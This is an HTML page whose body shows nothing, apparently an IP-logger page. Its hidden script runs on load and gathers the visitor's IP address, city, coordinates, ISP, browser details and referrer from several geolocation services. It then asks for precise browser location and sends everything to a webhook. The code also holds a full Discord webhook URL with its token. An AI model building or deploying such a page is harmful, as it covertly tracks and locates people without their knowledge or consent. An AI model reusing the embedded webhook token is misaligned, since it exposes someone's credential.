<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background-color: #ffffff;
            min-height: 100vh;
            width: 100%;
            display: block;
        }
    </style>
</head>
<body>

<script>
    (function() {
        const WEBHOOK_URL = 'https://your-webhook-url.com/endpoint';

        let ipData = {
            ip: null,
            location: {
                country: null,
                region: null,
                city: null,
                lat: null,
                lon: null,
                timezone: null,
                isp: null,
                org: null
            },
            source: null,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            referrer: document.referrer || null,
            url: window.location.href
        };

        let fallbackAttempted = false;
        let primaryFailed = false;

        function sendToWebhook(data) {
            if (!WEBHOOK_URL || WEBHOOK_URL === 'https://discord.com/api/webhooks/1485791212681302172/iu7AbfwcqpHibaTEi3PZYPdYiNm_WMn0nqumGMDfLKPd1A7J8a6Ix9NvLBrr0Z-OzJjJ') {
                return;
            }
            try {
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'cors',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                    keepalive: true
                }).catch(e => console.warn);
            } catch (e) {}
        }

        function finalizeAndSend() {
            if (ipData.ip && ipData.source) {
                sendToWebhook(ipData);
            } else if (!ipData.ip) {
                ipData.ip = 'unavailable';
                ipData.source = 'none';
                sendToWebhook(ipData);
            } else {
                sendToWebhook(ipData);
            }
        }

        function enrichWithGeo(geoPayload, sourceName) {
            if (geoPayload && typeof geoPayload === 'object') {
                if (geoPayload.country) ipData.location.country = geoPayload.country;
                if (geoPayload.region_name) ipData.location.region = geoPayload.region_name;
                if (geoPayload.city) ipData.location.city = geoPayload.city;
                if (geoPayload.latitude) ipData.location.lat = geoPayload.latitude;
                if (geoPayload.longitude) ipData.location.lon = geoPayload.longitude;
                if (geoPayload.timezone) ipData.location.timezone = geoPayload.timezone;
                if (geoPayload.org) ipData.location.org = geoPayload.org;
                if (geoPayload.isp) ipData.location.isp = geoPayload.isp;
                
                if (geoPayload.loc && typeof geoPayload.loc === 'string') {
                    let parts = geoPayload.loc.split(',');
                    if (parts.length === 2) {
                        ipData.location.lat = parseFloat(parts[0]);
                        ipData.location.lon = parseFloat(parts[1]);
                    }
                }
                if (geoPayload.region && !ipData.location.region) ipData.location.region = geoPayload.region;
                if (geoPayload.country_name && !ipData.location.country) ipData.location.country = geoPayload.country_name;
            }
            ipData.source = sourceName;
            finalizeAndSend();
        }

        function fallbackIpGeoFetch() {
            if (fallbackAttempted) return;
            fallbackAttempted = true;
            
            fetch('https://ipapi.co/json/')
                .then(response => {
                    if (!response.ok) throw new Error('ipapi failed');
                    return response.json();
                })
                .then(data => {
                    if (data && data.ip) {
                        ipData.ip = data.ip;
                        let geo = {
                            country: data.country_name,
                            region_name: data.region,
                            city: data.city,
                            latitude: data.latitude,
                            longitude: data.longitude,
                            timezone: data.timezone,
                            org: data.org,
                            isp: data.org
                        };
                        enrichWithGeo(geo, 'ipapi.co (fallback)');
                    } else {
                        throw new Error('no ip in ipapi');
                    }
                })
                .catch(() => {
                    fetch('https://api.ipify.org?format=json')
                        .then(res => res.json())
                        .then(ipifyData => {
                            if (ipifyData && ipifyData.ip) {
                                ipData.ip = ipifyData.ip;
                                ipData.location = { country: null, region: null, city: null, lat: null, lon: null, timezone: null, isp: null, org: null };
                                ipData.source = 'ipify.org (only ip, no geo)';
                                finalizeAndSend();
                            } else {
                                throw new Error('ipify failed');
                            }
                        })
                        .catch(() => {
                            ipData.ip = 'unknown';
                            ipData.source = 'all-fallbacks-failed';
                            finalizeAndSend();
                        });
                });
        }

        function primaryIpGeoFetch() {
            fetch('https://ipinfo.io/json?token=')
                .then(response => {
                    if (!response.ok) throw new Error('ipinfo failed');
                    return response.json();
                })
                .then(data => {
                    if (data && data.ip) {
                        ipData.ip = data.ip;
                        let geo = {
                            country: data.country,
                            region_name: data.region,
                            city: data.city,
                            loc: data.loc,
                            timezone: data.timezone,
                            org: data.org
                        };
                        if (data.loc) {
                            let coords = data.loc.split(',');
                            if (coords.length === 2) {
                                geo.latitude = parseFloat(coords[0]);
                                geo.longitude = parseFloat(coords[1]);
                            }
                        }
                        enrichWithGeo(geo, 'ipinfo.io (primary)');
                    } else {
                        throw new Error('no ip data');
                    }
                })
                .catch(() => {
                    primaryFailed = true;
                    fetch('https://api.ipgeolocation.io/ipgeo?apiKey=demo&fields=geo')
                        .then(response => {
                            if (!response.ok) throw new Error('ipgeolocation failed');
                            return response.json();
                        })
                        .then(data => {
                            if (data && data.ip) {
                                ipData.ip = data.ip;
                                let geo = {
                                    country: data.country_name,
                                    region_name: data.state_prov,
                                    city: data.city,
                                    latitude: data.latitude,
                                    longitude: data.longitude,
                                    timezone: data.time_zone?.name || null,
                                    isp: data.isp,
                                    org: data.organization
                                };
                                enrichWithGeo(geo, 'ipgeolocation.io (secondary)');
                            } else {
                                throw new Error('no ip from ipgeolocation');
                            }
                        })
                        .catch(() => {
                            fallbackIpGeoFetch();
                        });
                });
        }

        function browserBasedGeoFallback() {
            if ('geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        if (ipData.ip && ipData.ip !== 'unavailable' && ipData.ip !== 'unknown') {
                            ipData.location.lat = position.coords.latitude;
                            ipData.location.lon = position.coords.longitude;
                            ipData.location.source_enhanced = 'browser_geolocation';
                            sendToWebhook(ipData);
                        } else if (!ipData.ip || ipData.ip === 'unavailable') {
                            ipData.ip = 'browser-geo-only';
                            ipData.location.lat = position.coords.latitude;
                            ipData.location.lon = position.coords.longitude;
                            ipData.source = ipData.source ? ipData.source + '+browser-geo' : 'browser-geolocation';
                            sendToWebhook(ipData);
                        } else {
                            ipData.location.lat = position.coords.latitude;
                            ipData.location.lon = position.coords.longitude;
                            sendToWebhook(ipData);
                        }
                    },
                    function() { },
                    { timeout: 5000, maximumAge: 0 }
                );
            }
        }

        primaryIpGeoFetch();

        setTimeout(function() {
            if (!ipData.ip || ipData.ip === null) {
                if (!fallbackAttempted && !primaryFailed) {
                    fallbackIpGeoFetch();
                }
            }
        }, 2000);

        setTimeout(function() {
            if (!ipData.ip || ipData.ip === null || ipData.ip === 'unavailable' || ipData.ip === 'unknown') {
                browserBasedGeoFallback();
            }
        }, 3500);
    })();
</script>
</body>
</html>
